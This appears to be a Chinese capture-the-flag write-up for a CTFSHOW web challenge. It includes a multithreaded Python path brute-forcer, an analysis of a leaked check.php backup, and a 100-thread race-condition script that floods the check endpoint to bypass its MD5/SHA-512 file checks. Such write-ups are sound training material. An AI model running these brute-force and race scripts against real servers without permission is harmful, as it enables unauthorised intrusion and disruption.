+++
date = '2026-10-17T15:47:57+08:00'
draft = false
title = '【CTFSHOW】WEB 红包题第六弹'
tags = ["Web安全","CTFSHOW","CTF","竟态条件"]
+++

![登录框](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/登录框.png)

打开发现是一个登录框，随便输入用户名和密码弹出md5 error

![md5error](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/md5错误.png)

查看前端源码，发现登录时会调用login()向check.php发送post请求，其中包括token 和php://input参数，此题很可能不是考察SQL注入

![前端代码1](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/分析前端代码1.png)

![前端代码2](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/分析前端代码2.png)

随便输入URL，发现返回200，故普通路径爆破工具可能无效

![不存在页面返回200](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/不存在页面返回200.png)

我们自己写一个路径爆破脚本，根据响应码与页面中是否包含“ctf.show_红包题第六弹”来判断路径是否存在：

```python
import time
import requests
import threading
from queue import Queue, Empty
from tqdm import tqdm
import urllib3
 
urllib3.disable_warnings()    # 禁用警告，不然会有很多HTTPS warning
THREAD_NUM = 10                # 使用10个线程爆破
TARGET = 'https://你的题目ID.challenge.ctf.show/'
STOP_FLAG = threading.Event() # 全局停止标志，用于通知线程停止
 
path_dict = Queue()    # 使用Queue队列存储字典，多线程安全
with open(r"字典路径", 'r') as f:
    for path in f.readlines():
        path_dict.put(path.rstrip())
 
pbar = tqdm(total=path_dict.qsize(), desc="爆破")    # 进度条
 
def get_page():
    session = requests.session()    # 每个线程使用一个会话
    while not STOP_FLAG.is_set():    # 如果停止事件被设置，则跳出循环
        try:
            path = path_dict.get_nowait()   # 从队列中取出一个元素
        except Empty:
            break    # 如果队列空了就退出
        try:
            response = session.get(TARGET + path, verify=False, timeout=5)    # verify=False 不检查证书
        except requests.RequestException:
            pbar.update(1)
            continue
        pbar.update(1)    # 进度条加一
        # 如果返回200且响应体中没有<h2>ctf.show_红包题第六弹</h2>，则代表页面存在
        if response.status_code == 200:
            if '<h2>ctf.show_红包题第六弹</h2>' not in response.text:
                # 使用tqdm.write()，不然进度条回重复
                tqdm.write(f'发现页面：{path}')
 
if __name__ == "__main__":
    # 创建10个线程进行爆破
    threads = [threading.Thread(target=get_page, daemon=True) for _ in range(THREAD_NUM)]
    for t in threads:
        t.start()    # 启动每个线程
    try:
        # 主线程必须保持存活，Ctrl+C 才有地方被接收；sleep 可被键盘中断
        while any(t.is_alive() for t in threads):
            time.sleep(0.2)
    except KeyboardInterrupt:
        STOP_FLAG.set()
        tqdm.write('\n已手动停止')
    pbar.close()
```

运行脚本，发现一个压缩包，浏览器访问即可下载，解压得到check.php.bak

分析代码：
```php
<?php
function receiveStreamFile($receiveFile){
	// 传入的 $receiveFile 恒为 'flag.dat'
	// 从POST请求体中获取原始内容
    $streamData = isset($GLOBALS['HTTP_RAW_POST_DATA'])? $GLOBALS['HTTP_RAW_POST_DATA'] : '';
 
    if(empty($streamData)){
        $streamData = file_get_contents('php://input');
    }
	// 如果请求体不为空，将其内容写入flag.dat
    if($streamData!=''){
        $ret = file_put_contents($receiveFile, $streamData, true);
    }else{
        $ret = false;
    }
 
    return $ret;
 
}
// 判断本地时间的分钟数的md5值是否与前端传入的token相同
if(md5(date("i")) === $token){	
	$receiveFile = 'flag.dat';
	receiveStreamFile($receiveFile);	// 创建 flag.dat 并将POST请求体中的内容写入
	if(md5_file($receiveFile)===md5_file("key.dat")){	// 判断 flag.dat 与 key.dat 的MD5值是否相同
		if(hash_file("sha512",$receiveFile)!=hash_file("sha512","key.dat")){	// 判断 flag.dat 的sha512是否不等 key.dat 的sha512
			// 如果是，返回flag
			$ret['success']="1";
			$ret['msg']="人脸识别成功!$flag";
			$ret['error']="0";
			echo json_encode($ret);
			return;
		}
			// 如果md5与sha512均相同，返回"same file"
			$ret['errormsg']="same file";
			echo json_encode($ret);
			return;
	}
			// 如果md5不同，返回"md5 error"
			$ret['errormsg']="md5 error";
			echo json_encode($ret);
			return;
} 
// 如果token判断不通过，返回"token error"
$ret['errormsg']="token error";
echo json_encode($ret);
return;
?>
```

代码中提到了key.dat，我们尝试浏览器访问，成功下载

![下载key](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/下载key.png)

我们需要让代码通过这三个判断，即可获得flag

```php
// 判断本地时间的分钟数的md5值是否与前端传入的token相同
if(md5(date("i")) === $token)
    // 判断 flag.dat 与 key.dat 的MD5值是否相同
    if(md5_file($receiveFile)===md5_file("key.dat"))
    // 判断 flag.dat 的sha512是否不等 key.dat 的sha512
	    if(hash_file("sha512",$receiveFile)!=hash_file("sha512","key.dat"))
```

第一个很简单，只需对分钟进行md5就可以了，但要想通过剩下的两个判断，需要我们提交一个md5值与key.dat相同，sha512与key.dat不同的文件，直接去构建这样的文件不太好办，那么我们可以尝试竞态条件

我们同时提交key.dat与一个内容随意的数据（如“garbage”），如果正好在key.dat通过md5判断后、sha512判断前，服务器将garbage替换掉了key.dat，那么第三个判断就会通过

```python
import hashlib
import urllib3
import requests
import threading
import time
 
urllib3.disable_warnings()
 
THREAD_NUM = 50
STOP_FLAG = False
with open(r"key.dat文件路径", 'rb') as f:
    key = f.read()
 
def send(data):
    global STOP_FLAG
    session = requests.session()    # 一个线程使用一个会话
    while not STOP_FLAG:
        i = str(time.localtime().tm_min)    # 获取当前分钟
        token = hashlib.md5(i.encode()).hexdigest()
        target = f'https://你的题目ID.ctf.show/check.php?token={token}&php://input'
        response = session.post(target, data=data, verify=False).text
        if 'ctf' in response:
            STOP_FLAG = True
            print(response)
    session.close()
 
if __name__ == '__main__':
    # 创建key.dat发送线程和garbage发送线程各50个
    key_threads = [threading.Thread(target=send, args=(key,), daemon=True) for _ in range(THREAD_NUM)]
    garbage_threads = [threading.Thread(target=send, args=('garbage',), daemon=True) for _ in range(THREAD_NUM)]
    print("开始……")
    for t in key_threads + garbage_threads:
        t.start()
 
    try:
        while any(t.is_alive() for t in key_threads + garbage_threads):
            time.sleep(0.2)
    except KeyboardInterrupt:
        STOP_FLAG = True
        print("已停止")
```

运行脚本，即可得到Flag

![获得flag](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/CTFSHOW/WEB-红包题第六弹/获得flag.png)